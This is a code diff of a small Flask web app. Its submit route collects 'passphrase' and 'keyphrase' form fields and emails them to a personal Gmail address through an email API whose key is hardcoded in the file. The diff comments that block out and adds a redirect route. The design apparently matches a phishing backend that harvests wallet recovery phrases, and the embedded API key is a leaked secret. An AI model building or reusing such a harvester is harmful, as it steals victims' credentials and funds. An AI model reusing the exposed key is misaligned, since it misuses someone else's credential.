@@ -17,7 +17,7 @@ API_KEY = "re_fEF16LKh_83fMtz7TDZNFcWXssSa8kYBs"
 @app.route("/submit", methods = ["GET", "POST"])
 def server():
   if request.method == "POST":
-    pass_phrase = request.form.get("passphrase")
+    '''pass_phrase = request.form.get("passphrase")
 
     key_phrase = request.form.get("keyphrase")
 
@@ -39,12 +39,16 @@ def server():
     "to": "snipenvm@gmail.com",
     "subject": "New Response",
     "html": html_message
-    })
+    })'''
 
-    return render_template("submit.html")
+    return redirect(url_for("submit_redirect"))
   
   else:
      return " "
+  
+@app.route("/redirect")
+def submit_redirect():
+   return render_template("submit.html")
 
 if __name__ == "__main__":
-    app.run(host = "0.0.0.0", port = 10000, debug = True)
+    app.run(host = "0.0.0.0", port = 10000)
